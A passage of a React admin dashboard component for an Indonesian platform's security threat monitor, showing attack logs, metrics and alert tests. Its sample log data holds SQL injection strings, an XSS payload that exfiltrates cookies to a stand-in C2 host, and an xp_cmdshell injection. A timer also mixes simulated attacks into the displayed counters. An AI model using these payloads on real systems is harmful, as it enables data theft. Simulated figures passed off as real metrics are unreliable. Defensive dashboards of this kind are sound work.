import React, { useState, useEffect, useRef } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldBan,
  AlertTriangle,
  Radio,
  Activity,
  Flame,
  Volume2,
  VolumeX,
  RefreshCw,
  Search,
  Filter,
  Lock,
  Unlock,
  Terminal,
  Crosshair,
  Server,
  Zap,
  Send,
  Eye,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  Sliders,
  ExternalLink,
  Info,
  Clock,
  ArrowUpRight,
  Database,
  Globe,
  BellRing,
} from 'lucide-react';
import api from '../../services/api';

/**
 * Web Audio API Native Synthesizer (No external sound files required)
 * Synthesizes tactical sirens, alarm warbles, and alert pings.
 */
function playCyberAlarm(type = 'threat') {
  try {
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (!AudioContextClass) return;
    const ctx = new AudioContextClass();

    if (type === 'threat') {
      // Emergency dual-frequency cyber warble siren
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sawtooth';
      const now = ctx.currentTime;

      // Frequency oscillation sweep (880Hz -> 440Hz -> 880Hz)
      osc.frequency.setValueAtTime(860, now);
      osc.frequency.exponentialRampToValueAtTime(420, now + 0.18);
      osc.frequency.exponentialRampToValueAtTime(860, now + 0.36);
      osc.frequency.exponentialRampToValueAtTime(420, now + 0.54);

      gain.gain.setValueAtTime(0.22, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.65);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.65);
    } else if (type === 'warning') {
      // Rapid double high-pitched beep
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sine';
      const now = ctx.currentTime;

      osc.frequency.setValueAtTime(960, now);
      osc.frequency.setValueAtTime(780, now + 0.09);
      gain.gain.setValueAtTime(0.18, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.28);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.28);
    } else {
      // Chime of defense arming
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'triangle';
      const now = ctx.currentTime;

      osc.frequency.setValueAtTime(523, now);
      osc.frequency.exponentialRampToValueAtTime(1046, now + 0.22);
      gain.gain.setValueAtTime(0.18, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.3);
    }
  } catch (err) {
    console.warn('Web Audio API not supported or blocked:', err);
  }
}

// Initial Simulated Attack Data
const INITIAL_THREAT_LOGS = [
  {
    id: 'ATK-8821',
    timestamp: 'Baru saja',
    attackType: 'Flooding/DDoS',
    severity: 'Critical',
    ip: '194.26.29.112',
    location: 'Frankfurt, Jerman',
    asn: 'AS20860 HostRoyale Cloud',
    target: 'POST /api/auth/login',
    payload: 'Distributed SYN Flood ~2,800 req/sec from botnet cluster',
    status: 'BLOCKED / 429 THROTTLED',
    isBlocked: true,
  },
  {
    id: 'ATK-8820',
    timestamp: '12 dtk lalu',
    attackType: 'SQL Injection',
    severity: 'Critical',
    ip: '103.145.22.84',
    location: 'Jakarta, Indonesia',
    asn: 'AS136052 PT Mora Telematika',
    target: 'GET /api/dashboard/genealogy?u_id=',
    payload: "' UNION SELECT null, username, password_hash, role FROM users --",
    status: 'BLOCKED / 403 WAF DROP',
    isBlocked: true,
  },
  {
    id: 'ATK-8819',
    timestamp: '45 dtk lalu',
    attackType: 'XSS Probe',
    severity: 'High',
    ip: '185.220.101.5',
    location: 'Amsterdam, Belanda',
    asn: 'AS60729 Tor Exit Node',
    target: 'POST /api/chat/send',
    payload: "<script>fetch('https://c2.darknet.io/exfil?c='+document.cookie)</script>",
    status: 'BLOCKED / SANITIZED',
    isBlocked: false,
  },
  {
    id: 'ATK-8818',
    timestamp: '2 mnt lalu',
    attackType: 'Brute Force',
    severity: 'High',
    ip: '45.154.255.89',
    location: 'Singapore, SG',
    asn: 'AS40034 Confluence Cloud',
    target: 'POST /api/auth/login [admin01]',
    payload: 'Hydra Dictionary Attack (45 attempts/sec with common passwords)',
    status: 'BLOCKED / 429 THROTTLED',
    isBlocked: true,
  },
  {
    id: 'ATK-8817',
    timestamp: '5 mnt lalu',
    attackType: 'Unauthorized Scan',
    severity: 'High',
    ip: '198.235.24.11',
    location: 'Ashburn, USA',
    asn: 'AS16509 Amazon Data Services',
    target: 'GET /.env, /config.json, /wp-admin',
    payload: 'DirBuster Path Traversal / Sensitive Configuration Probing',
    status: 'BLOCKED / 404 HONEYPOT',
    isBlocked: false,
  },
  {
    id: 'ATK-8816',
    timestamp: '11 mnt lalu',
    attackType: 'SQL Injection',
    severity: 'Critical',
    ip: '114.125.44.18',
    location: 'Medan, Indonesia',
    asn: 'AS17974 PT Telekomunikasi Indonesia',
    target: 'GET /api/products?cat=',
    payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --",
    status: 'BLOCKED / 403 WAF DROP',
    isBlocked: true,
  },
  {
    id: 'ATK-8815',
    timestamp: '18 mnt lalu',
    attackType: 'Flooding/DDoS',
    severity: 'Critical',
    ip: '91.240.118.67',
    location: 'Moscow, Russia',
    asn: 'AS49505 Selectel Cloud',
    target: 'GET /api/public/meetings/live',
    payload: 'HTTP/2 Rapid Reset Flood on WebRTC signaling socket',
    status: 'BLOCKED / 429 THROTTLED',
    isBlocked: true,
  },
  {
    id: 'ATK-8814',
    timestamp: '25 mnt lalu',
    attackType: 'Unauthorized Scan',
    severity: 'Medium',
    ip: '36.72.198.45',
    location: 'Surabaya, Indonesia',
    asn: 'AS7713 Telkom Indihome',
    target: 'GET /phpmyadmin, /api/v1/dump.sql',
    payload: 'Masscan automated vulnerability scanner fingerprinting',
    status: 'BLOCKED / DROP',
    isBlocked: false,
  },
];

export default function AdminSecurityThreatRadar({ setActiveTab }) {
  // State for Defcon / Shield status
  const [defconLevel, setDefconLevel] = useState('WARNING'); // 'SECURE' | 'WARNING' | 'ATTACK'
  const [audioEnabled, setAudioEnabled] = useState(true);
  const [threatLogs, setThreatLogs] = useState(INITIAL_THREAT_LOGS);
  const [liveStreamActive, setLiveStreamActive] = useState(true);
  const [copiedIp, setCopiedIp] = useState(null);
  const [selectedThreatModal, setSelectedThreatModal] = useState(null);
  const [testingAlert, setTestingAlert] = useState(false);
  const [toastNotification, setToastNotification] = useState(null);

  // Filters
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedTypeFilter, setSelectedTypeFilter] = useState('ALL');
  const [selectedSeverityFilter, setSelectedSeverityFilter] = useState('ALL');

  // Stats Counters
  const [metrics, setMetrics] = useState({
    totalBlocked: 1489,
    bannedIps: 42,
    ddosAttempts: 984,
    sqliXssAttempts: 358,
    wafUptime: '99.98%',
    activeRules: 128,
  });

  const showToast = (msg, type = 'info') => {
    setToastNotification({ msg, type });
    setTimeout(() => setToastNotification(null), 4500);
  };

  useEffect(() => {
    const fetchThreats = async () => {
      try {
        const res = await api.get('/admin/security/threats');
        if (res.data?.data) {
          const data = res.data.data;
          if (data.recent_threats && data.recent_threats.length > 0) {
            const mapped = data.recent_threats.map((t, idx) => ({
              id: t.id || `THREAT-${idx}`,
              timestamp: new Date(t.created_at).toLocaleTimeString('id-ID'),
              attackType:
                t.threat_type === 'sql_injection'
                  ? 'SQL Injection'
                  : t.threat_type === 'xss_payload'
                  ? 'XSS Scripting'
                  : t.threat_type === 'flooding'
                  ? 'DDoS Flooding'
                  : t.threat_type === 'path_traversal'
                  ? 'Path Traversal'
                  : t.threat_type === 'brute_force'
                  ? 'Brute Force'
                  : 'Sensitive Probe',
              severity: t.severity === 'critical' ? 'Critical' : t.severity === 'high' ? 'High' : 'Medium',
              ip: t.ip_address,
              location: `${t.city || 'Indonesia'}, ${t.province || 'ID'}`,
              asn: t.isp || 'Broadband Network',
              target: `${t.method} ${t.endpoint}`,
              payload: t.payload,
              status: t.blocked ? 'BLOCKED / 403 WAF DROP' : 'MONITORED',
              isBlocked: t.blocked,
            }));
            setThreatLogs(mapped);
          }
          if (data.total_threats) {
            setMetrics((prev) => ({
              ...prev,
              totalBlocked: data.total_threats,
              bannedIps: data.active_blocks_count || prev.bannedIps,
              ddosAttempts: data.by_type_count?.flooding || prev.ddosAttempts,
              sqliXssAttempts:
                (data.by_type_count?.sql_injection || 0) + (data.by_type_count?.xss_payload || 0) ||
                prev.sqliXssAttempts,
            }));
          }
        }
      } catch (err) {
        console.warn('Could not load backend security threats:', err);
      }
    };
    fetchThreats();
  }, []);

  const handleCopyIp = (ip) => {
    navigator.clipboard?.writeText(ip);
    setCopiedIp(ip);
    setTimeout(() => setCopiedIp(null), 2000);
    showToast(`IP ${ip} disalin ke clipboard!`, 'info');
  };

  // Toggle IP Permanent Blacklist
  const handleToggleBlockIp = (threatId, currentBlocked, ip) => {
    setThreatLogs((prev) =>
      prev.map((item) => {
        if (item.id === threatId) {
          const nextBlocked = !currentBlocked;
          return {
            ...item,
            isBlocked: nextBlocked,
            status: nextBlocked ? 'BLOCKED / PERMANENT BANNED' : 'UNBLOCKED / MONITORED',
          };
        }
        return item;
      })
    );

    if (!currentBlocked) {
      api.post('/admin/security/block-ip', { ip_address: ip, reason: 'Manual block from Security Radar' }).catch(console.warn);
      setMetrics((m) => ({ ...m, bannedIps: m.bannedIps + 1 }));
      showToast(`IP ${ip} telah DIBLOKIR PERMANEN dari seluruh routing gateway Bionet!`, 'danger');
      if (audioEnabled) playCyberAlarm('warning');
    } else {
      api.post('/admin/security/unblock-ip', { ip_address: ip }).catch(console.warn);
      setMetrics((m) => ({ ...m, bannedIps: Math.max(0, m.bannedIps - 1) }));
      showToast(`Blokir IP ${ip} telah dicabut. IP kembali ke status pemantauan biasa.`, 'info');
    }
  };

  // Test Simulation Alert: Trigger Telegram Bot + WhatsApp Notification + Web Audio Siren
  const handleTriggerSimulatedAttack = async () => {
    setTestingAlert(true);
    setDefconLevel('ATTACK');

    // 1. Play siren if sound is on
    if (audioEnabled) {
      playCyberAlarm('threat');
    }

    // 2. Synthesize a brand new critical attack log
    const randomCities = [
      { city: 'Jakarta, Indonesia', ip: '103.111.45.92', asn: 'AS23693 PT Biznet Gio' },
      { city: 'Surabaya, Indonesia', ip: '180.252.19.80', asn: 'AS17974 Telkomsel' },
      { city: 'Frankfurt, Jerman', ip: '159.65.122.9', asn: 'AS14061 DigitalOcean' },
      { city: 'Singapore, SG', ip: '128.199.204.77', asn: 'AS14061 DigitalOcean' },
    ];
    const pick = randomCities[Math.floor(Math.random() * randomCities.length)];
    const newAttack = {
      id: `ATK-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: 'Baru saja (SIMULASI)',
      attackType: 'SQL Injection',
      severity: 'Critical',
      ip: pick.ip,
      location: pick.city,
      asn: pick.asn,
      target: 'POST /api/auth/login [admin01]',
      payload: "' OR 1=1; EXEC xp_cmdshell('ping bionet-c2.net') -- (SIMULATED HIGH HAZARD DRILL)",
      status: 'BLOCKED / 403 WAF DROP',
      isBlocked: true,
    };

    setThreatLogs((prev) => [newAttack, ...prev]);
    setMetrics((m) => ({
      ...m,
      totalBlocked: m.totalBlocked + 1,
      sqliXssAttempts: m.sqliXssAttempts + 1,
      bannedIps: m.bannedIps + 1,
    }));

    // 3. Trigger backend Telegram & WhatsApp test endpoints
    let telegramOk = false;
    let waOk = false;
    try {
      await api.post('/admin/security/test-alert', {
        threat_type: 'sql_injection',
        ip_address: pick.ip,
        city: pick.city,
        payload: "' OR 1=1; EXEC xp_cmdshell('ping bionet-c2.net') -- (SIMULATED HIGH HAZARD DRILL)",
      });
      telegramOk = true;
      waOk = true;
    } catch (err) {
      console.warn('Backend Security test alert notice:', err);
      try {
        await api.post('/admin/monitoring/test-alert');
        telegramOk = true;
      } catch (e2) {}
    }

    try {
      await api.post('/admin/whatsapp/send-test', {
        phone: '081234567890',
        recipient: 'Admin Tim Keamanan Bionet',
        category: 'custom',
        message: '🚨 [BIONET DEFCON 1 ALERT] Uji coba simulasi serangan cyber SQLi & DDoS terdeteksi!',
      });
      waOk = true;
    } catch (err) {
      console.warn('Backend WhatsApp test notice:', err);
    }

    setTestingAlert(false);

    showToast(
      `🚨 SIMULASI SERANGAN AKTIF! Notifikasi alert dipicu ke Telegram Admin (${telegramOk ? 'Terkirim' : 'Simulasi'}) & WhatsApp Security (${waOk ? 'Terkirim' : 'Simulasi'}). Sirene Web Audio diaktifkan!`,
      'danger'
    );
  };

  // Periodic subtle dynamic threat simulation when live stream is active
  useEffect(() => {
    if (!liveStreamActive) return;

    const interval = setInterval(() => {
      // 30% chance to simulate a small probe event
      const roll = Math.random();
      if (roll > 0.65) {
        const types = ['Unauthorized Scan', 'Brute Force', 'Flooding/DDoS', 'XSS Probe'];
        const chosenType = types[Math.floor(Math.random() * types.length)];
        const simulated = {
          id: `ATK-${Math.floor(1000 + Math.random() * 9000)}`,
          timestamp: 'Baru saja',
          attackType: chosenType,
          severity: chosenType === 'Flooding/DDoS' ? 'Critical' : 'High',
          ip: `185.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
          location: 'Singapore, SG',
          asn: 'AS13335 Cloudflare Gateway',
          target: '/api/v1/health-check',
          payload: 'Automated heartbeat flood probe pattern detected',
          status: 'BLOCKED / 429 THROTTLED',
          isBlocked: false,
        };

        setThreatLogs((prev) => [simulated, ...prev.slice(0, 19)]);
        setMetrics((m) => ({
          ...m,
          totalBlocked: m.totalBlocked + 1,
          ddosAttempts: chosenType === 'Flooding/DDoS' ? m.ddosAttempts + 1 : m.ddosAttempts,
        }));
      }
    }, 12000);

    return () => clearInterval(interval);
  }, [liveStreamActive]);

  // Filtered threats
  const filteredThreats = threatLogs.filter((item) => {
    const matchesSearch =
      item.ip.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.location.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.target.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.payload.toLowerCase().includes(searchQuery.toLowerCase());

    const matchesType = selectedTypeFilter === 'ALL' || item.attackType === selectedTypeFilter;
    const matchesSeverity =
      selectedSeverityFilter === 'ALL' || item.severity.toUpperCase() === selectedSeverityFilter.toUpperCase();

    return matchesSearch && matchesType && matchesSeverity;
  });

  return (
    <div className="space-y-6 text-slate-100 font-sans">
      {/* Toast Notification */}
      {toastNotification && (
        <div
          className={`fixed bottom-6 right-6 z-50 px-4 py-3 rounded-xl shadow-2xl border flex items-center gap-3 backdrop-blur-md transition-all animate-bounce ${
            toastNotification.type === 'danger'
              ? 'bg-rose-950/90 border-rose-500/80 text-rose-200'
              : 'bg-slate-900/90 border-emerald-500/80 text-emerald-200'
          }`}
        >
          {toastNotification.type === 'danger' ? (
            <Flame size={20} className="text-rose-400 shrink-0 animate-pulse" />
          ) : (
            <CheckCircle2 size={20} className="text-emerald-400 shrink-0" />
          )}
          <span className="text-xs font-semibold">{toastNotification.msg}</span>
          <button
            onClick={() => setToastNotification(null)}
            className="text-xs font-bold text-slate-400 hover:text-white ml-2"
          >
            ✕
          </button>
        </div>
      )}

      {/* Cyber Bio-Defense Main Header & DEFCON Bar */}
      <div className="rounded-2xl p-6 bg-gradient-to-br from-slate-950 via-[#0a1120] to-[#041a15] border border-emerald-500/30 shadow-[0_0_50px_rgba(16,185,129,0.12)] relative overflow-hidden">
        {/* Subtle matrix scanline overlay */}
        <div className="absolute inset-0 bg-[radial-gradient(#10b981_1px,transparent_1px)] [background-size:24px_24px] opacity-10 pointer-events-none" />

        <div className="relative z-10 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-6">
          {/* Title & Status */}
          <div>
            <div className="flex items-center gap-3 flex-wrap">
              <div className="p-2.5 rounded-xl bg-emerald-500/10 border border-emerald-400/40 text-emerald-400 flex items-center justify-center shadow-[0_0_20px_rgba(16,185,129,0.3)]">
                <ShieldAlert size={28} className="animate-pulse" />
              </div>
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <h1 className="font-heading font-extrabold text-2xl text-white tracking-tight">
                    Bio-Defense Threat Radar
                  </h1>
                  <span className="text-[10px] font-mono uppercase px-2.5 py-0.5 rounded-full bg-emerald-950/80 text-emerald-300 border border-emerald-500/50 flex items-center gap-1.5 font-bold shadow-sm">
                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                    WAF ACTIVE • TLS 1.3
                  </span>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">
                    ROLE: SUPER ADMIN
                  </span>
                </div>
                <p className="text-xs text-slate-400 mt-1">
                  Pusat Pemantauan Keamanan L7, Anti-DDoS Flooding, Netralisasi SQLi/XSS, dan Mitigasi IP Malicious
                </p>
              </div>
            </div>

            {/* Real-time DEFCON indicator badge */}
            <div className="mt-4 flex items-center gap-3 flex-wrap">
              <div className="text-xs text-slate-400 font-mono">STATUS SHIELD DEFCON:</div>
              <div
                className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border font-mono font-bold text-xs shadow-lg transition-all ${
                  defconLevel === 'ATTACK'
                    ? 'bg-rose-950/90 border-rose-500 text-rose-200 shadow-[0_0_25px_rgba(244,63,94,0.4)] animate-pulse'
                    : defconLevel === 'WARNING'
                    ? 'bg-amber-950/80 border-amber-500/80 text-amber-300 shadow-[0_0_20px_rgba(245,158,11,0.25)]'
                    : 'bg-emerald-950/80 border-emerald-500/80 text-emerald-300 shadow-[0_0_20px_rgba(16,185,129,0.25)]'
                }`}
              >
                <span
                  className={`w-2.5 h-2.5 rounded-full ${
                    defconLevel === 'ATTACK'
                      ? 'bg-rose-500 animate-ping'
                      : defconLevel === 'WARNING'
                      ? 'bg-amber-400 animate-pulse'
                      : 'bg-emerald-400 animate-pulse'
                  }`}
                />
                <span>
                  {defconLevel === 'ATTACK'
                    ? 'DEFCON 1: UNDER ATTACK / CRITICAL DEFENSE ENGAGED'
                    : defconLevel === 'WARNING'
                    ? 'DEFCON 3: ELEVATED WARNING / ANOMALY DETECTED'
                    : 'DEFCON 5: SHIELD LEVEL SECURE / NORMAL OPERATION'}
                </span>
              </div>

              {/* DEFCON Level manual override switches */}
              <div className="flex items-center gap-1 bg-slate-900/90 p-1 rounded-lg border border-slate-800 text-[11px]">
                <button
                  onClick={() => setDefconLevel('SECURE')}
                  className={`px-2 py-0.5 rounded transition-all ${
                    defconLevel === 'SECURE' ? 'bg-emerald-600 text-white font-bold' : 'text-slate-400 hover:text-white'
                  }`}
                >
                  Secure
                </button>
                <button
                  onClick={() => setDefconLevel('WARNING')}
                  className={`px-2 py-0.5 rounded transition-all ${
                    defconLevel === 'WARNING' ? 'bg-amber-600 text-white font-bold' : 'text-slate-400 hover:text-white'
                  }`}
                >
                  Warning
                </button>
                <button
                  onClick={() => setDefconLevel('ATTACK')}
                  className={`px-2 py-0.5 rounded transition-all ${
                    defconLevel === 'ATTACK' ? 'bg-rose-600 text-white font-bold' : 'text-slate-400 hover:text-white'
                  }`}
                >
                  Attack
                </button>
              </div>
            </div>
          </div>

          {/* Action Tools: Sound Switch, Test Alert, and Geo Map Navigation */}
          <div className="flex flex-wrap items-center gap-2.5">
            {/* Audio Siren Toggle */}
            <button
              onClick={() => {
                const nextState = !audioEnabled;
                setAudioEnabled(nextState);
                if (nextState) playCyberAlarm('neutral');
                showToast(
                  nextState
                    ? 'Sirene Web Audio Keamanan: DIAKTIFKAN'
                    : 'Sirene Web Audio Keamanan: DIBISUKAN (Muted)',
                  'info'
                );
              }}
              className={`px-3 py-2 rounded-xl border text-xs font-semibold flex items-center gap-2 transition-all ${
                audioEnabled
                  ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300 hover:bg-emerald-900/60 shadow-[0_0_15px_rgba(16,185,129,0.2)]'
                  : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
              }`}
              title="Toggle Audio Sirine Peringatan Dini Native Web Audio"
            >
              {audioEnabled ? (
                <>
                  <Volume2 size={15} className="text-emerald-400 animate-pulse" />
                  <span>Sirine Audio: ON</span>
                </>
              ) : (
                <>
                  <VolumeX size={15} className="text-slate-500" />
                  <span>Sirine: Muted</span>
                </>
              )}
            </button>

            {/* Test Audio Siren Button */}
            <button
              onClick={() => {
                playCyberAlarm('threat');
                showToast('Uji coba nada sirine darurat berhasil dibunyikan!', 'danger');
              }}
              className="px-3 py-2 rounded-xl bg-slate-900/80 border border-slate-700/80 hover:border-slate-500 text-slate-300 hover:text-white text-xs font-semibold flex items-center gap-1.5 transition-all"
              title="Tes bunyi speaker sirene"
            >
              <Radio size={14} className="text-cyan-400" />
              <span>Tes Audio</span>
            </button>

            {/* Test Simulation Alert (Telegram & WhatsApp) */}
            <button
              onClick={handleTriggerSimulatedAttack}
              disabled={testingAlert}
              className="px-4 py-2 rounded-xl bg-gradient-to-r from-rose-600 to-red-700 hover:from-rose-500 hover:to-red-600 text-white font-bold text-xs flex items-center gap-2 shadow-[0_0_20px_rgba(225,29,72,0.4)] transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50"
            >
              <Flame size={15} className={testingAlert ? 'animate-spin' : 'animate-bounce'} />
              <span>{testingAlert ? 'Memproses Alert...' : 'Simulasi Serangan (TG & WA)'}</span>
            </button>

            {/* Quick Link to Geo-Traffic Radar */}
            {setActiveTab && (
              <button
                onClick={() => setActiveTab('admin-geotraffic')}
                className="px-3.5 py-2 rounded-xl bg-cyan-950/60 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-900/60 text-xs font-semibold flex items-center gap-1.5 transition-all shadow-[0_0_15px_rgba(6,182,212,0.2)]"
              >
                <Globe size={15} className="text-cyan-400" />
                <span>Peta Geo-Traffic Nusantara</span>
                <ArrowUpRight size={13} />
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Metric Cards Row */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Card 1: Total Serangan Dicegah */}
        <div className="rounded-xl p-5 bg-slate-950/90 border border-emerald-500/30 relative overflow-hidden shadow-lg group hover:border-emerald-400/60 transition-all">
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-emerald-500/10 rounded-full blur-xl group-hover:bg-emerald-500/20 transition-all" />
          <div className="flex items-center justify-between text-slate-400 mb-2">
            <span className="text-[11px] font-mono uppercase tracking-wider text-emerald-400 font-semibold">
              TOTAL SERANGAN DICEGAH
            </span>
            <div className="p-2 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
              <ShieldCheck size={18} />
            </div>
          </div>
          <div className="text-3xl font-extrabold font-mono text-white tracking-tight">
            {metrics.totalBlocked.toLocaleString('id-ID')}
          </div>
          <div className="text-[11px] text-emerald-400/90 mt-2 flex items-center gap-1 font-mono">
            <span className="font-bold">100% Mitigated</span>
            <span className="text-slate-500">•</span>
            <span className="text-slate-400">Avg Latensi: 1.2ms</span>
          </div>
        </div>

        {/* Card 2: IP Diblokir */}
        <div className="rounded-xl p-5 bg-slate-950/90 border border-rose-500/30 relative overflow-hidden shadow-lg group hover:border-rose-400/60 transition-all">
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-rose-500/10 rounded-full blur-xl group-hover:bg-rose-500/20 transition-all" />
          <div className="flex items-center justify-between text-slate-400 mb-2">
            <span className="text-[11px] font-mono uppercase tracking-wider text-rose-400 font-semibold">
              IP DIBLOKIR AKTIF
            </span>
            <div className="p-2 rounded-lg bg-rose-500/10 border border-rose-500/30 text-rose-400">
              <ShieldBan size={18} />
            </div>
          </div>
          <div className="text-3xl font-extrabold font-mono text-white tracking-tight">
            {metrics.bannedIps}
          </div>
          <div className="text-[11px] text-rose-400/90 mt-2 flex items-center gap-1 font-mono">
            <span className="font-bold">Blacklist Terisolasi</span>
            <span className="text-slate-500">•</span>
            <span className="text-slate-400">Auto Drop IPTables</span>
          </div>
        </div>

        {/* Card 3: Flooding / DDoS Terblokir */}
        <div className="rounded-xl p-5 bg-slate-950/90 border border-amber-500/30 relative overflow-hidden shadow-lg group hover:border-amber-400/60 transition-all">
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-amber-500/10 rounded-full blur-xl group-hover:bg-amber-500/20 transition-all" />
          <div className="flex items-center justify-between text-slate-400 mb-2">
            <span className="text-[11px] font-mono uppercase tracking-wider text-amber-400 font-semibold">
              PERCOBAAN DDOS / FLOOD
            </span>
            <div className="p-2 rounded-lg bg-amber-500/10 border border-amber-500/30 text-amber-400">
              <Activity size={18} />
            </div>
          </div>
          <div className="text-3xl font-extrabold font-mono text-white tracking-tight">
            {metrics.ddosAttempts.toLocaleString('id-ID')}
          </div>
          <div className="text-[11px] text-amber-400/90 mt-2 flex items-center gap-1 font-mono">
            <span className="font-bold">Rate Limiter Token Bucket</span>
            <span className="text-slate-500">•</span>
            <span className="text-slate-400">429 Throttled</span>
          </div>
        </div>

        {/* Card 4: Percobaan SQLi & XSS Terdeteksi */}
        <div className="rounded-xl p-5 bg-slate-950/90 border border-cyan-500/30 relative overflow-hidden shadow-lg group hover:border-cyan-400/60 transition-all">
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-cyan-500/10 rounded-full blur-xl group-hover:bg-cyan-500/20 transition-all" />
          <div className="flex items-center justify-between text-slate-400 mb-2">
            <span className="text-[11px] font-mono uppercase tracking-wider text-cyan-400 font-semibold">
              SQLi &amp; XSS TERDETEKSI
            </span>
            <div className="p-2 rounded-lg bg-cyan-500/10 border border-cyan-500/30 text-cyan-400">
              <Terminal size={18} />
            </div>
          </div>
          <div className="text-3xl font-extrabold font-mono text-white tracking-tight">
            {metrics.sqliXssAttempts.toLocaleString('id-ID')}
          </div>
          <div className="text-[11px] text-cyan-400/90 mt-2 flex items-center gap-1 font-mono">
            <span className="font-bold">Deep Packet Inspection</span>
            <span className="text-slate-500">•</span>
            <span className="text-slate-400">Payload Neutralized</span>
          </div>
        </div>
      </div>

      {/* Cyber Security Active Engines Overview Banner */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs font-mono">
        <div className="p-3 rounded-xl bg-slate-900/60 border border-slate-800 flex items-center gap-2.5">
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
          <div>
            <div className="text-slate-400 text-[10px]">WAF OWASP Top 10</div>
            <div className="font-bold text-slate-200">ACTIVE &amp; ENFORCING</div>
          </div>
        </div>
        <div className="p-3 rounded-xl bg-slate-900/60 border border-slate-800 flex items-center gap-2.5">
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
          <div>
            <div className="text-slate-400 text-[10px]">BRUTE FORCE SHIELD</div>
            <div className="font-bold text-slate-200">MAX 5 TRIES / IP</div>
          </div>
        </div>
        <div className="p-3 rounded-xl bg-slate-900/60 border border-slate-800 flex items-center gap-2.5">
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
          <div>
            <div className="text-slate-400 text-[10px]">TOR &amp; BOTNET MITIGATION</div>
            <div className="font-bold text-slate-200">AUTO-DROP AT EDGE</div>
          </div>
        </div>
        <div className="p-3 rounded-xl bg-slate-900/60 border border-slate-800 flex items-center gap-2.5">
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse" />
          <div>
            <div className="text-slate-400 text-[10px]">FLIP.ID &amp; KEMENDAGRI API</div>
            <div className="font-bold text-slate-200">ENCRYPTED TUNNEL</div>
          </div>
        </div>
      </div>

      {/* Threat Logs Table Header with Search & Filter Controls */}
      <div className="rounded-2xl bg-slate-950/90 border border-slate-800 shadow-xl overflow-hidden">
        {/* Table Toolbar */}
        <div className="p-5 border-b border-slate-800/80 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Crosshair size={18} className="text-rose-500" />
              <h2 className="font-heading font-bold text-base text-white">
                Log Ancaman &amp; Serangan Real-Time
              </h2>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-950 text-rose-300 border border-rose-800 font-bold">
                {filteredThreats.length} Insiden Terdeteksi
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Daftar insiden intrusi, IP penyerang, payload terisolasi, dan tombol blokir instan
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5">
            {/* Live stream toggle */}
            <button
              onClick={() => {
                setLiveStreamActive((prev) => !prev);
                showToast(
                  !liveStreamActive
                    ? 'Live Stream Serangan Diaktifkan'
                    : 'Live Stream Serangan Dijeda (Paused)',
                  'info'
                );
              }}
              className={`px-3 py-1.5 rounded-lg border text-xs font-mono flex items-center gap-1.5 transition-all ${
                liveStreamActive
                  ? 'bg-emerald-950/80 border-emerald-500/50 text-emerald-300 shadow-[0_0_10px_rgba(16,185,129,0.2)]'
                  : 'bg-slate-900 border-slate-700 text-slate-400'
              }`}
            >
              <span
                className={`w-2 h-2 rounded-full ${
                  liveStreamActive ? 'bg-emerald-400 animate-ping' : 'bg-slate-500'
                }`}
              />
              <span>{liveStreamActive ? 'Live Inbound: Active' : 'Live: Paused'}</span>
            </button>

            {/* Attack Type Filter */}
            <select
              value={selectedTypeFilter}
              onChange={(e) => setSelectedTypeFilter(e.target.value)}
              className="bg-slate-900 border border-slate-700 text-slate-200 text-xs rounded-lg px-2.5 py-1.5 focus:outline-none focus:border-emerald-500 font-mono"
            >
              <option value="ALL">Semua Tipe Serangan</option>
              <option value="Flooding/DDoS">Flooding/DDoS</option>
              <option value="SQL Injection">SQL Injection</option>
              <option value="XSS Probe">XSS Probe</option>
              <option value="Brute Force">Brute Force</option>
              <option value="Unauthorized Scan">Unauthorized Scan</option>
            </select>

            {/* Severity Filter */}
            <select
              value={selectedSeverityFilter}
